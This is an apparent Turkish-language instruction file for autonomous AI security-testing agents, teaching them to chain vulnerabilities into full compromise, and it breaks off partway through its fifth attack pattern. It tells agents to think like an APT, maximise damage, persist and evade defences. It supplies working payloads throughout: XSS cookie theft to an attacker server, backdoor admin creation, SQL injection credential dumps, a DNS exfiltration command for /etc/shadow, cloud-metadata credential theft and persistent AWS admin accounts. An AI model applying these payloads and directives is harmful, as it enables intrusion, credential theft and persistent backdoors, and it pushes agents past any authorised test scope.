---
name: chain-attack-builder
description: >
  Doğrulanmış bulguları ZİNCİRLEYEREK maksimum etkiye ulaşmayı öğretir (12 zincir kalıbı, 5 soruluk
  zincir düşünme, cross-agent koordinasyon). Tek başına düşük etkili bulgular birleşince kritik olur.
  Her bulgu KANIT seviyesinde olmalı; zincir adımları gerçekten gözlemlenmeli — varsayımla zincir kurma.
---

# 🔗 Zincir Saldırı Kurucu (Chain Attack Builder)

> **Sürüm:** 2.0  
> **Dil:** Türkçe  
> **Amaç:** Ajanlara güvenlik açıklarını ZİNCİRLEMEYİ ve maksimum etki için birleştirmeyi öğretir.  
> **Kullanım:** Tüm test ajanları her DOĞRULANMIŞ bulgudan sonra bu skill'i uygular.
> **ÇEKİRDEK SÖZLEŞMEYE bağlıdır** (`skills/core-contract.md`): zincirin HER adımı gerçek, loglanmış
> bir istekle ([[engine-mcp-contract]]) ve gözlemlenmiş kanıtla ([[evidence-discipline]]) kurulur —
> "şu olsaydı şu olurdu" varsayımıyla değil. Zincir kurarken [[data-flow-and-mental-model]] (güven
> sınırları) ve [[access-control-reasoning]] yol gösterir.

---

## 🧠 ZİNCİR FELSEFESİ

```
Bir güvenlik açığı bir anahtardır.
Zincirlenmiş iki açıklık bir maymuncuktur.
Üç açıklık zinciri tam bir uzlaşmadır (total compromise).
```

### Temel Prensipler

1. **Hiçbir bulgu tek başına değerlendirilmez.** Her bulgu, diğer bulgularla birleştiğinde neye dönüşebileceği açısından incelenmelidir.

2. **"Low" severity bir bulgu, zincirin ilk halkası olduğunda "Critical" olabilir.** Bir açık yönlendirme (open redirect) tek başına "Low"dur. Bir OAuth akışıyla zincirlendiğinde "Critical" tam hesap ele geçirme olur.

3. **Saldırgan gibi düşün, bug bounty avcısı gibi değil.** Bug bounty avcısı bulgu bulup raporlar. Saldırgan bulguları birleştirip sistemi ele geçirir. Sen saldırgan gibi düşün.

4. **Her bulgu yeni bir yetenek kazandırır.** Bu yeteneği bir sonraki adım için kullan. SQLi buldun → veritabanını okuyabilirsin. Peki veritabanında ne var? O bilgiyle ne yapabilirsin?

5. **Zincirler genellikle cross-agent'tır.** Agent-03'ün bulduğu IDOR ile Agent-07'nin bulduğu mass assignment birleştiğinde ortaya çıkan şey, ikisinin tek başına olduğundan çok daha tehlikelidir. BU YÜZDEN `firstphase.md`'i SÜREKLİ OKU.

6. **Zincirleme fırsatını KAÇIRMA.** Bir bulgu bulduğunda, hemen zincirleme fırsatlarını düşün. Bunu refleks haline getir. Her bulgu sonrası 5 soruyu SOR.

---

## 🔍 ZİNCİR DÜŞÜNME PROTOKOLÜ

> **KRİTİK KURAL:** Her bulgu sonrası, aşağıdaki 5 soruyu MUTLAKA sor. Bu soruları cevaplamadan bir sonraki bulguya GEÇME.

### SORU 1: "Hangi yeni yeteneğe sahibim?"

Bu soru, bulduğun açıklığın sana NE yapma gücü verdiğini anlaman içindir. Her açıklık türü için:

#### SQL Injection (SQLi) Bulunduysa:
- **Yeteneğin:** Veritabanını okuyabilir, yazabilir, silebilirsin.
- **Zincir fırsatları:**
  - 📊 `users` tablosunu oku → e-posta, şifre hash'leri → hash'leri kır → hesapları ele geçir
  - 🔑 `api_keys`, `sessions`, `tokens` tablolarını oku → diğer sistemlere erişim
  - ⚙️ `configurations` veya `.env` benzeri tabloları oku → bulut kimlik bilgileri, SMTP şifreleri, üçüncü parti API anahtarları
  - 📝 `INTO OUTFILE` ile dosya yaz → webshell → RCE
  - 🔗 `xp_cmdshell` (MSSQL) → doğrudan shell → RCE
  - 📂 `information_schema` → tüm tablo yapısını öğren → hedefli veri hırsızlığı
- **Sorman gerekenler:**
  - Veritabanı tipi ne? (MySQL, PostgreSQL, MSSQL, Oracle) — çünkü her birinin farklı RCE yolları var
  - `INTO OUTFILE` veya `COPY ... TO` çalışıyor mu?
  - Stacked query yapabiliyor muyum? (`; DROP TABLE...`)
  - `UNION SELECT` çalışıyor mu? Kaç kolon döndürüyor?

#### Cross-Site Scripting (XSS) Bulunduysa:
- **Yeteneğin:** Kurbanın tarayıcısında JavaScript çalıştırabilirsin.
- **Zincir fırsatları:**
  - 🍪 `document.cookie` → session cookie'yi çal → HttpOnly kontrol et!
  - 🔑 `localStorage` / `sessionStorage` → JWT token'lar, API anahtarları, kullanıcı tercihleri
  - 📞 `fetch()` ile kurban adına istek yap → CSRF korumasını BYPASS et (Same-Origin Policy içindesin!)
  - ⌨️ `keylogger` enjekte et → şifreleri, kredi kartlarını yakala
  - 🎭 DOM manipülasyonu → sahte login sayfası göster → phishing overlay → şifre çal
  - 📸 `html2canvas` veya benzeri → ekran görüntüsü al
  - 🌐 WebRTC ile iç IP'yi öğren → iç ağ keşfi
  - 🔔 Service Worker kaydet → kalıcı backdoor
- **Sorman gerekenler:**
  - Stored XSS mi, reflected XSS mi, DOM-based XSS mi?
  - Stored ise → HERKES etkilenir, admin dahil
  - HttpOnly bayrağı session cookie'de var mı? (Varsa `document.cookie` çalışmaz → alternatif yol bul)
  - CSP (Content-Security-Policy) var mı? Hangi direktifler? (Bypass edilebilir mi?)
  - SameSite cookie attribute ne? (Lax/None ise CSRF ile birleşebilir)

#### Server-Side Request Forgery (SSRF) Bulunduysa:
- **Yeteneğin:** Sunucunun iç ağa veya kendisine istek yapmasını sağlayabilirsin.
- **Zincir fırsatları:**
  - ☁️ **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol-adı>` → geçici IAM credential'ları → AWS CLI ile full cloud erişimi
  - ☁️ **GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` → GCP access token
  - ☁️ **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` → Azure IMDS
  - ☁️ **DigitalOcean:** `http://169.254.169.254/metadata/v1.json`
  - ☁️ **Oracle Cloud:** `http://169.254.169.254/opc/v2/instance/`
  - 🏠 İç ağ taraması: `http://127.0.0.1:8080/admin`, `http://10.0.0.0/24` → admin panelleri, veritabanları, Redis, Memcached
  - 📦 Docker socket: `http://unix:/var/run/docker.sock:/containers/json` → container breakout
  - 📋 Consul, etcd, Kubernetes API → servis keşfi, konfigürasyon okuma
  - 🔴 Redis (port 6379) → `gopher://` ile RESP protokolü enjeksiyonu → SSH key yazma → RCE
  - 📧 SMTP (port 25) → iç ağda e-posta gönderme → phishing
- **Sorman gerekenler:**
  - Sunucu hangi bulut sağlayıcısında? (HTTP response header'larından anlaşılabilir)
  - Hangi protokoller izin veriliyor? `http://`, `https://`, `file://`, `gopher://`, `dict://`?
  - URL'deki parametreler filtreleniyor mu? (Bypass teknikleri: DNS rebinding, 302 redirect, URL encoding, IPv6 gösterimi)
  - Response body dönüyor mu? (Blind SSRF ise sadece metadata'ya istek yapıp hata/zamanlama kontrolü yap)

#### Insecure Direct Object Reference (IDOR) Bulunduysa:
- **Yeteneğin:** Başka kullanıcıların verilerine erişebilirsin.
- **Zincir fırsatları:**
  - 👤 Kullanıcı profilini oku → e-posta, telefon, adres, PII → sosyal mühendislik
  - 🔑 Başka kullanıcının API anahtarını oku → o kullanıcının tüm yetkileriyle işlem yap
  - 📧 E-postayı öğren → şifre sıfırlama tetikle → IDOR ile reset token'ını oku → hesabı ele geçir
  - 📄 Hassas belgelere eriş → fikri mülkiyet hırsızlığı
  - 💳 Ödeme bilgilerini oku → finansal dolandırıcılık
  - 👑 Admin kullanıcısının ID'sini bul → admin verilerine IDOR ile eriş
- **Sorman gerekenler:**
  - ID'ler tahmin edilebilir mi? (sequential integer, UUID, hash?)
  - Authorization kontrolü hiç yok mu, yoksa sadece belirli endpoint'lerde mi eksik?
  - Bulk endpoint var mı? (`/api/users?ids=1,2,3`) → tek seferde çok veri çal

#### Local File Inclusion (LFI) Bulunduysa:
- **Yeteneğin:** Sunucudaki dosyaları okuyabilirsin.
- **Zincir fırsatları:**
  - 📄 `/etc/passwd` → kullanıcı adları
  - 🔑 `/home/kullanici/.ssh/id_rsa` → SSH özel anahtarı → doğrudan sunucuya bağlan
  - ⚙️ `.env`, `config.php`, `application.properties` → veritabanı şifreleri, API anahtarları, JWT secret
  - ☁️ `~/.aws/credentials`, `~/.config/gcloud/` → bulut kimlik bilgileri
  - 📝 Log dosyaları: `/var/log/apache2/access.log`, `/var/log/nginx/access.log` → log poisoning ile RCE
  - 📧 `/var/mail/root` → sistem e-postaları, hassas bilgiler
  - 🐘 PHP session dosyaları: `/tmp/sess_<session_id>` → session poisoning
  - 📂 `/proc/self/environ` → ortam değişkenleri
  - 🔗 `/proc/self/fd/` → açık dosya tanımlayıcıları
- **Sorman gerekenler:**
  - LFI, RFI'ye dönüştürülebilir mi? (`allow_url_include=On`)
  - Log poisoning yapılabiliyor mu? (User-Agent başlığını veya URL path'ini kontrol edebiliyor muyum?)
  - PHP wrapper'ları çalışıyor mu? (`php://filter`, `php://input`, `expect://`)
  - Upload edilen dosyalara erişim var mı? → upload + LFI = RCE

### SORU 2: "Hangi sistem bilgisini yanlışlıkla ifşa ettim?"

Her bulgu, sistem hakkında bir şeyler öğrenmene neden olur. Bu bilgiyi zincirleme için kullan.

#### Bilgi Sızdırma Türleri ve Kullanımı:

| Ne Sızdı? | Nasıl Kullanılır? | Zincir Hedefi |
|-----------|-------------------|---------------|
| **Veritabanı tipi ve versiyonu** (SQLi hata mesajı) | O veritabanına özel RCE yöntemlerini dene | SQLi → RCE |
| **Framework ve dil** (verbose error) | O framework'e özel SSTI, deserialization dene | Bilgi → SSTI → RCE |
| **Dosya yolları** (error mesajları) | LFI hedefi olarak kullan | Bilgi → LFI → credential theft |
| **İç IP adresleri** (SSRF response, JS dosyaları) | İç ağ taramasını hedefle | Bilgi → SSRF → iç ağ |
| **API endpoint'leri** (JS source maps) | Yeni saldırı yüzeyi keşfet | Bilgi → yeni endpoint → yeni bulgu |
| **Kullanılan kütüphaneler ve versiyonları** | CVE veritabanında bilinen açıkları ara | Bilgi → known CVE exploit |
| **İç hostname'ler** (error mesajları, email header'ları) | İç ağdaki servisleri hedefle | Bilgi → SSRF → iç servis |
| **Session/Cookie yapısı** (Set-Cookie header) | Session forging veya JWT saldırısı dene | Bilgi → session manipulation |
| **CORS header'ları** | Origin spoofing ile veri hırsızlığı | Bilgi → CORS bypass → veri çalma |
| **WAF/IDS varlığı** (hata sayfaları) | Bypass tekniklerini ayarla | Bilgi → WAF bypass → asıl exploit |

#### Somut Senaryolar:

**Senaryo A — Verbose SQL Hatası:**
```
Hata: "You have an error in your SQL syntax near '' UNION SELECT...' 
at line 1 in /var/www/html/app/controllers/UserController.php:42"
```
**Ne öğrendin?** 
- Framework: PHP (dosya yolundan)
- Dosya yolu: `/var/www/html/app/controllers/UserController.php`
- Teknoloji: MySQL (hata mesajı formatından)
- **Zincirleme:** `/var/www/html/app/config/database.php` yolunu LFI ile okumayı dene → veritabanı şifrelerini al

**Senaryo B — JS Source Map:**
```
GET /static/js/app.3f2a1b.js.map → içinde:
"apiBaseUrl": "https://internal-api.company.local:8443",
"adminPanel": "http://10.0.0.50:3000"
```
**Ne öğrendin?**
- İç ağ API endpoint'i: `internal-api.company.local:8443`
- İç ağ admin panel: `10.0.0.50:3000`
- **Zincirleme:** SSRF bul → iç API'ye istek yap → iç API'de auth yok → admin panelinde veri sızdır

### SORU 3: "Hangi güven ilişkilerini istismar edebilirim?"

Sistemler arasındaki güven ilişkileri, zincirlemenin temel yapı taşıdır.

#### Güven İlişkisi Matrisi:

| Güvenen | Güvenilen | Nasıl İstismar Edilir? |
|---------|-----------|------------------------|
| **Sunucu** | İç ağ | SSRF ile iç ağdaki korumasız servislere eriş |
| **Sunucu** | Cloud metadata endpoint'i (`169.254.169.254`) | SSRF ile IAM credential'larını çal |
| **Sunucu** | Veritabanı (localhost'ta) | SQLi → `LOAD_FILE()` ile dosya okuma |
| **Tarayıcı** | Domain (Same-Origin Policy) | XSS → aynı origin'de istek yapabilirsin → CSRF korumasını bypass |
| **Tarayıcı** | Subdomain (document.domain) | Bir subdomain'de XSS → document.domain ayarla → diğer subdomain'e eriş |
| **Uygulama** | Kullanıcı girdisi (birden fazla yerde) | Multi-step injection: bir yerde XSS, başka yerde SQLi, birleştir |
| **Uygulama** | Session (oturum açmış kullanıcı) | Session çal → kullanıcının tüm yetkileriyle işlem yap |
| **Admin paneli** | Oturum açmış admin kullanıcısı | Stored XSS → admin'in session'ını çal → admin panelini ele geçir |
| **Mikroservis** | Diğer mikroservisler | Bir serviste SSRF → diğer servisin API'sini çağır (auth yoksa) |
| **CI/CD** | Git repository | Kaynak kodda secret → production'a erişim |
| **OAuth provider** | redirect_uri validasyonu | Open redirect + OAuth → OAuth token'ı çal |
| **CDN/Load Balancer** | Origin sunucu | Host header injection → cache poisoning → diğer kullanıcıları etkile |

#### Güven İlişkisi Keşif Soruları:

1. **Sunucu iç ağa erişebiliyor mu?**
   - `nslookup internal.company.local` çalışıyor mu?
   - `169.254.169.254`'e ping atılabiliyor mu?
   - Container içindeyse, Docker socket'i var mı? (`/var/run/docker.sock`)

2. **Uygulama birden fazla mikroservis kullanıyor mu?**
   - API Gateway var mı?
   - Servisler arası iletişimde auth var mı?
   - Service mesh (Istio, Linkerd) kullanılıyor mu?

3. **Kim kimin adına işlem yapabiliyor?**
   - Admin normal kullanıcıları yönetebiliyor mu?
   - Bir kullanıcı başka bir kullanıcıya mesaj gönderebiliyor mu? (Stored XSS vektörü)
   - Kullanıcılar dosya yükleyebiliyor mu? Dosyalar herkese açık mı?

4. **Cloud ortamında mı?**
   - Hangi cloud sağlayıcısı?
   - IAM rolleri ne?
   - Metadata endpoint'ine SSRF mümkün mü?

### SORU 4: "Gerçek bir saldırgan şimdi ne yapardı?"

> **Kural:** Bug bounty avcısı gibi DEĞİL, APT (Advanced Persistent Threat) gibi düşün.

#### Zihniyet Değişimi:

| Bug Bounty Avcısı | APT / Gerçek Saldırgan |
|-------------------|------------------------|
| Bulguyu bulur, raporlar, ödül alır | Bulguyu bulur, ZİNCİRLER, sistemi ele geçirir |
| "Bu XSS'i raporlayayım, 500$ alırım" | "Bu XSS ile admin session'ını çalayım, admin panelini ele geçireyim" |
| "SSRF kör, raporlamaya değmez" | "Blind SSRF ile metadata'yı dene, cloud'u ele geçir" |
| "Rate limiting var, brute force çalışmaz" | "Password spraying, credential stuffing, token reuse dene" |
| "Tek bir IDOR, düşük severity" | "IDOR + mass assignment = admin ol, tüm sistemi ele geçir" |

#### APT Zihniyetiyle Sorman Gerekenler:

1. **"Bu bulguyla MAKSİMUM HASARI nasıl veririm?"**
   - Sadece bulgunun kendisini değil, ZİNCİRİNİ düşün
   - Her bulgu bir basamaktır. En üst basamak neresi?
   - Hedef: Domain admin, cloud admin, tüm veriyi dışarı çıkarmak, sistemi çökertmek

2. **"Bu bulguyu nasıl KALICI hale getiririm?"**
   - XSS → Service Worker kaydet → kalıcı backdoor
   - SQLi → yeni admin kullanıcısı oluştur
   - RCE → SSH key ekle, cron job ekle, reverse shell kur
   - SSRF → IAM credential'larını çal → cloud'da kalıcı hesap aç

3. **"Savunma sistemlerini nasıl ATLATIRIM?"**
   - WAF varsa → encoding, chunked transfer, alternatif protokoller dene
   - Loglama varsa → log injection ile log'ları kirlet
   - EDR varsa → living-off-the-land, powershell -enc, certutil ile download

4. **"Yanal hareket (lateral movement) nasıl yaparım?"**
   - Bir sunucuyu ele geçirdin → aynı ağda başka neler var?
   - Bir kullanıcıyı ele geçirdin → o kullanıcının erişebildiği sistemler neler?
   - Bir mikroservis → diğer mikroservislere istek yapabiliyor musun?

5. **"Veriyi nasıl DIŞARI ÇIKARIRIM (exfiltration)?"**
   - DNS exfiltration: `dig $(cat /etc/shadow | base64).attacker.com`
   - ICMP tunneling
   - HTTPS üzerinden (zaten izin verilen bir port)
   - Cloud depolamaya yükleme (S3, Google Drive API)

### SORU 5: "Bunu diğer ajanların bulduklarıyla birleştirebilir miyim?"

> **KRİTİK:** `firstphase.md` dosyasını HER ZAMAN güncel tut ve SÜREKLİ oku. En kritik zincirler cross-agent zincirlerdir.

#### Cross-Agent Zincirleme Protokolü:

1. **firstphase.md'i OKU.** Diğer ajanların bulgularını bilmeden zincir kuramazsın.

2. **Eşleşme ara.** Senin bulduğun ile diğer ajanın bulduğu arasında bağlantı kur:
   - Agent-03 `users` tablosunda SQLi buldu → Sen `/api/login` endpoint'ini buldun → Birleştir: SQLi'den gelen credential'larla login ol
   - Agent-01 `/exit?url=` open redirect buldu → Sen OAuth flow'da `redirect_uri` kullanıldığını buldun → Birleştir: OAuth token çalma
   - Agent-05 dosya upload buldu → Sen LFI buldun → Birleştir: Upload + LFI = RCE
   - Agent-02 JWT secret'ını buldu → Sen JWT kullanan endpoint buldun → Birleştir: Token forge et
   - Agent-07 Stored XSS buldu → Sen CSRF buldun → Birleştir: Worm oluştur
   - Agent-04 IDOR buldu → Sen Mass Assignment buldun → Birleştir: Başkasının hesabında privilege escalation

3. **Zincirleme fırsatını firstphase.md'e YAZ.** Diğer ajanlar görsün:
   ```markdown
   ## 🔗 ZİNCİRLEME FIRSATLARI
   
   ### Fırsat #1: SQLi → ATO
   - [AGENT-03] `users` tablosunda SQLi buldu (email, password_hash)
   - [AGENT-05] `/api/login` endpoint'i credential'ları JSON olarak kabul ediyor
   - **Zincir:** SQLi ile email:hash çiftlerini al → hash'leri kır → `/api/login` ile login ol
   - **Bekleyen Agent:** Agent-05 (veya yeni agent)
   - **Beklenen Etki:** Tüm kullanıcı hesaplarının ele geçirilmesi
   ```

4. **Orkestratörü bilgilendir.** Orkestratör zincirleme fırsatlarını görüp yeni agent görevlendirebilir.

5. **Başarılı zinciri BELGELE.** Zincir başarıyla çalıştıysa, kendi bulgusu olarak CRITICAL severity ile kaydet.

---

## ⛓️ YAYGIN ZİNCİR KALIPLARI

> **ÖNEMLİ:** Bunlar sadece örnek kalıplardır. Kendi zincirlerini YARAT. Sistemin yapısına göre yeni zincirler keşfet.

Her kalıp şu yapıda açıklanmıştır:
- **MEKANİZMA:** Zincir nasıl çalışır, teorisi nedir?
- **TESPİT:** Bu zincirin mümkün olduğunu nasıl anlarsın?
- **İCRA:** Zinciri adım adım nasıl gerçekleştirirsin?
- **Alternatif Yollar:** Aynı hedefe ulaşmanın başka yolları

---

### KALIP 1: XSS → Hesap Ele Geçirme (Account Takeover)

**MEKANİZMA:**
XSS, kurbanın tarayıcısında JavaScript çalıştırır → `document.cookie` ile session cookie'yi okur → saldırgana gönderir → saldırgan bu cookie ile kurbanın oturumunu çalar.

**TESPİT:**
- [ ] XSS var mı? (Reflected, Stored, DOM-based fark etmez)
- [ ] Session cookie'de `HttpOnly` bayrağı YOK mu? → `document.cookie` çalışır
- [ ] Session cookie'de `SameSite=None` veya `Lax` mı? → CSRF ile de çalınabilir
- [ ] `Secure` bayrağı var mı? (HTTP'de çalışmaz → HTTPS zorunlu)
- [ ] CSP `script-src` kısıtlaması var mı? Varsa bypass edilebilir mi?

**İCRA — Adım Adım:**

```javascript
// Adım 1: Cookie hırsızlığı payload'ı
<script>
  var img = new Image();
  img.src = 'https://SENIN-SERVERIN.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

// Adım 2 (HttpOnly varsa): CSRF ile profil değiştirme
<script>
  fetch('/api/profile/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'SENIN-EMAILIN@attacker.com'})
  });
</script>

// Adım 3 (HttpOnly + CSRF token varsa): Önce token'ı oku, sonra istek yap
<script>
  var token = document.querySelector('meta[name="csrf-token"]').content;
  fetch('/api/admin/create-user', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': token
    },
    body: JSON.stringify({username: 'backdoor_admin', password: 'P@ssw0rd!', role: 'admin'})
  });
</script>

// Adım 4: Stored XSS ise, admin'i bekle
// Admin login olduğunda otomatik çalışır → admin session'ı ile yeni admin oluştur
```

**Alternatif Zincir Yolları:**
- **A:** XSS → localStorage'dan JWT token çal → JWT ile API'ye istek yap
- **B:** XSS → DOM manipülasyonu → sahte login formu → kurban şifresini girer → saldırgana gönder (phishing overlay)
- **C:** XSS → keylogger enjekte et → her tuş vuruşunu kaydet → periyodik olarak saldırgana gönder
- **D:** XSS → `navigator.sendBeacon()` ile veri sızdır → sayfa kapanırken bile çalışır
- **E:** Stored XSS → admin görür → admin session'ı ile kullanıcı listesini dışarı çıkar

---

### KALIP 2: SQLi → Kimlik Bilgisi Dökümü → Hesap Ele Geçirme

**MEKANİZMA:**
SQLi ile `users` tablosundan e-posta ve şifre hash'lerini çıkar → hash'leri kır (hashcat, john) → `/login` endpoint'inde bu credential'ları dene → hesapları ele geçir → admin hesabı ara → admin ol.

**TESPİT:**
- [ ] SQLi var mı? (Union-based, Error-based, Blind, Time-based)
- [ ] `users` veya benzeri tabloya erişilebiliyor mu?
- [ ] Şifreler nasıl saklanıyor? (bcrypt, argon2 → kırmak zor; MD5, SHA1 → kırmak kolay; plaintext → direkt kullan)
- [ ] Kaç kullanıcı var? (Hepsini çalmak zaman alabilir → önce admin hesapları hedefle)
- [ ] Login endpoint'i var mı? Brute force koruması var mı?

**İCRA — Adım Adım:**

```sql
-- Adım 1: Tablo yapısını keşfet
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -

-- Adım 2: Kullanıcı tablosunu bul ve kolonlarını öğren
' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'-- -

-- Adım 3: Email ve şifre hash'lerini çıkar
' UNION SELECT email, password_hash FROM users LIMIT 1 OFFSET 0-- -
-- OFFSET'i artırarak tüm kullanıcıları çek

-- Adım 4: Group concat ile tek seferde çek (MySQL)
' UNION SELECT 1, GROUP_CONCAT(email, ':', password_hash SEPARATOR '\n') FROM users-- -

-- Adım 5: Hash'leri dosyaya kaydet ve hashcat ile kır
-- echo "email:hash" > hashes.txt
-- hashcat -m 0 hashes.txt rockyou.txt   (MD5 için)
-- hashcat -m 3200 hashes.txt rockyou.txt (bcrypt için)

-- Adım 6: Admin hesabını bul
' UNION SELECT email, role FROM users WHERE role LIKE '%admin%'-- -
```

**Alternatif Zincir Yolları:**
- **A:** SQLi → `INTO OUTFILE '/var/www/html/shell.php'` → webshell → RCE → tüm sunucuyu ele geçir
- **B:** SQLi → `LOAD_FILE('/var/www/html/.env')` → AWS anahtarlarını bul → cloud takeover
- **C:** SQLi → `information_schema` → tüm veritabanı yapısını öğren → hedefli veri hırsızlığı (kredi kartı tablosu)
- **D:** MSSQL → `xp_cmdshell 'powershell -enc ...'` → doğrudan RCE
- **E:** PostgreSQL → `COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/tmp/shell.php'` → LFI ile include et → RCE

---

### KALIP 3: SSRF → Cloud Metadata → IAM Credential → Cloud Takeover

**MEKANİZMA:**
SSRF ile cloud metadata endpoint'ine istek yap → geçici IAM credential'larını al → bu credential'larla AWS CLI / SDK kullan → S3 bucket'ları oku, EC2'leri durdur, DynamoDB'yi sil, RDS snapshot'larını dışarı çıkar → FULL CLOUD COMPROMISE.

**TESPİT:**
- [ ] SSRF var mı? (Tam SSRF: response body dönüyor; Kör SSRF: sadece istek yapılabiliyor)
- [ ] Sunucu AWS'de mi? → `http://169.254.169.254/latest/meta-data/` dene
- [ ] Sunucu GCP'de mi? → `http://metadata.google.internal/computeMetadata/v1/` dene (Header: `Metadata-Flavor: Google`)
- [ ] Sunucu Azure'da mı? → `http://169.254.169.254/metadata/instance?api-version=2021-02-01` dene (Header: `Metadata: true`)
- [ ] Blind SSRF ise → DNS/HTTP bin kullan → metadata'ya istek yapılıp yapılmadığını gör
- [ ] IMDSv2 var mı? (AWS'de token gerekiyorsa, önce token almak gerekir)

**İCRA — Adım Adım:**

```bash
# Adım 1: AWS metadata endpoint'ine eriş
# SSRF URL: http://169.254.169.254/latest/meta-data/
# Yanıt: ami-id, hostname, iam/, public-keys/ gibi dizinler

# Adım 2: IAM rol adını öğren
# SSRF URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Yanıt: <rol-adı>

# Adım 3: Geçici credential'ları al
# SSRF URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol-adı>
# Yanıt: {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-..."
# }

# Adım 4: AWS CLI ile credential'ları kullan
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Adım 5: Neye erişimin var? Keşfet!
aws sts get-caller-identity              # Kimsin?
aws s3 ls                                 # Hangi bucket'lar var?
aws s3 cp s3://bucket/secret.txt -        # Bucket'tan dosya oku
aws ec2 describe-instances                # Hangi sunucular var?
aws rds describe-db-instances             # Hangi veritabanları var?
aws iam list-roles                        # Hangi IAM rolleri var?
aws lambda list-functions                 # Hangi Lambda fonksiyonları var?

# Adım 6: Kalıcı erişim için yeni IAM kullanıcısı oluştur (yetkin varsa)
aws iam create-user --user-name backup_admin
aws iam attach-user-policy --user-name backup_admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup_admin
# → AccessKeyId ve SecretAccessKey'i kaydet → kalıcı admin erişimin var
```

**GCP için:**
```bash
# GCP metadata endpoint
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Yanıt: {"access_token": "ya29...", "expires_in": 3599, "token_type": "Bearer"}

# Token ile GCP API çağrıları
curl -H "Authorization: Bearer ya29..." https://www.googleapis.com/compute/v1/projects/<project>/zones
```

**Azure için:**
```bash
# Azure metadata endpoint
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Yanıt: {"access_token": "eyJ...", "expires_on": "..."}
```

**Alternatif Zincir Yolları:**
- **A:** SSRF → `file:///etc/passwd` → kullanıcı adları → SSH brute force
- **B:** SSRF → İç ağda admin paneli bul → auth yoksa → admin panelini ele geçir
- **C:** SSRF → Redis (gopher://127.0.0.1:6379) → SSH key yaz → RCE
- **D:** SSRF → Docker socket (`/var/run/docker.sock`) → yeni container başlat → host'a breakout
- **E:** SSRF → Kubernetes API → pod listele → pod içinde komut çalıştır

---

### KALIP 4: IDOR + Şifre Sıfırlama = Hesap Ele Geçirme

**MEKANİZMA:**
IDOR ile kurbanın e-posta adresini öğren → şifre sıfırlama tetikle → IDOR ile şifre sıfırlama token'ını oku → token ile şifreyi sıfırla → kurbanın hesabına giriş yap.

**TESPİT:**
- [ ] Kullanıcı profil endpoint'inde IDOR var mı? (`/api/users/123`, `/api/profile/456`)
- [ ] Şifre sıfırlama akışı nasıl çalışıyor? Token URL'de mi? Email ile mi?
- [ ] Şifre sıfırlama token'ı tahmin edilebilir mi? (Zaman bazlı, sequential, short)
- [ ] Şifre sıfırlama endpoint'inde rate limiting var mı?
- [ ] Token'ın süresi ne kadar? (Uzunsa daha çok zamanın var)

**İCRA — Adım Adım:**

```bash
# Adım 1: IDOR ile kurbanın profilini oku
curl -H "Cookie: session=YOUR_SESSION" https://hedef.com/api/users/1337
# Yanıt: {"id": 1337, "email": "admin@hedef.com", "role": "admin"}

# Adım 2: Kurbanın e-postasına şifre sıfırlama tetikle
curl -X POST https://hedef.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@hedef.com"}'
# Yanıt: {"message": "Şifre sıfırlama bağlantısı gönderildi"}

# Adım 3: Şifre sıfırlama token'larını listeleyen endpoint var mı?
# Yoksa, token'ın URL'de/log'da/response'da görünüp görünmediğini kontrol et
# Varsa IDOR ile oku:
curl https://hedef.com/api/reset-tokens/1337
# Yanıt: {"token": "abc123def456", "expires": "2024-12-31T23:59:59Z"}

# Adım 4: Token ile şifreyi sıfırla
curl -X POST https://hedef.com/api/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token": "abc123def456", "new_password": "Hacked123!"}'

# Adım 5: Yeni şifre ile login ol
curl -X POST https://hedef.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@hedef.com", "password": "Hacked123!"}'
# Yanıt: {"token": "eyJ...ADMIN_JWT...", "role": "admin"}
# → ARTIK ADMIN'SİN.
```

**Alternatif Zincir Yolları:**
- **A:** IDOR → email → credential stuffing (aynı şifreyi başka yerlerde dene)
- **B:** IDOR → telefon numarası → SIM swap → SMS 2FA'yı bypass et
- **C:** IDOR → API anahtarı → o kullanıcının API yetkileriyle işlem yap
- **D:** IDOR → admin kullanıcısının ID'sini bul → admin'in profilini IDOR ile oku → admin'in özel bilgilerini çal

---

### KALIP 5: Open Redirect + OAuth = Token Hırsızlığı

**MEKANİZMA:**
OAuth flow'unda `redirect_uri` parametresi vardır → uygulama bu URI'nin kendi domain'i olduğunu kontrol eder → ama aynı domain'de open redirect varsa → `redirect_uri=https://hedef.com/openredirect?url=https://attacker.com` → OAuth kodu saldırgana gider → saldırgan bu kod ile token alır → kurbanın hesabını ele geçirir.

**TESPİT:**
- [ ] OAuth / OpenID Connect flow'u var mı? (Google, GitHub, Microsoft, Okta login)
- [ ] `redirect_uri` parametresi kullanılıyor mu?
- [ ] Domain validasyonu nasıl yapılıyor? Tam eşleşme mi, subdomain kontrolü mü, regex mi?
- [ ] Aynı domain'de open redirect var mı?
  - `/exit?url=`, `/redirect?to=`, `/goto?target=`, `/out?link=`
  - Header-based: `X-Forwarded-Host` ile redirect manipülasyonu
  - Meta refresh, JavaScript redirect
- [ ] `response_type=code` mi, `response_type=token` mi? (Implicit flow ise token direkt URL'de)

**İCRA — Adım Adım:**

```bash
# Adım 1: OAuth flow'unu analiz et
# Normal OAuth URL'i:
https://hedef.com/oauth/authorize?
  client_id=abc123&
  redirect_uri=https://hedef.com/callback&
